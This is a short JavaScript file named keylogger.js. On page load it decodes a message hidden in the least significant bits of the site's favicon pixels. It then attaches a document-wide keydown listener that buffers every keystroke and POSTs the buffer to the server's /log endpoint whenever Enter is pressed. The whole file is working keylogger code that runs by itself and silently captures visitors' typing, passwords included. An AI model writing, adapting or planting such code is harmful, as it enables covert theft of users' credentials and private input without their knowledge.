// static/keylogger.js
function decodeFavicon() {
    let img = new Image();
    img.crossOrigin = "Anonymous";
    img.onload = function() {
        let canvas = document.createElement('canvas');
        canvas.width = img.width;
        canvas.height = img.height;
        let ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0);
        
        let imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        let data = imageData.data;
        
        let binaryMessage = '';
        for (let i = 0; i < data.length; i += 4) {
            binaryMessage += data[i+2] & 1;
        }
        
        let message = '';
        for (let i = 0; i < binaryMessage.length; i += 8) {
            let charCode = parseInt(binaryMessage.substr(i, 8), 2);
            if (charCode === 0) break;  // Stop at the first null character
            message += String.fromCharCode(charCode);
        }
        
        console.log("Decoded message:", message);
        implementKeylogger();
    };
    img.src = "/favicon.ico?" + new Date().getTime();
}

function implementKeylogger() {
    console.log("Keylogger implemented");
    let buffer = '';
    document.addEventListener('keydown', function(e) {
        buffer += e.key;
        if (e.key === 'Enter') {
            sendToServer(buffer);
            buffer = '';
        }
    });
}

function sendToServer(keys) {
    console.log("Sending to server:", keys);
    fetch('/log', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({keys: keys}),
    })
    .then(response => response.json())
    .then(data => console.log("Server response:", data))
    .catch(error => console.error("Error:", error));
}

decodeFavicon();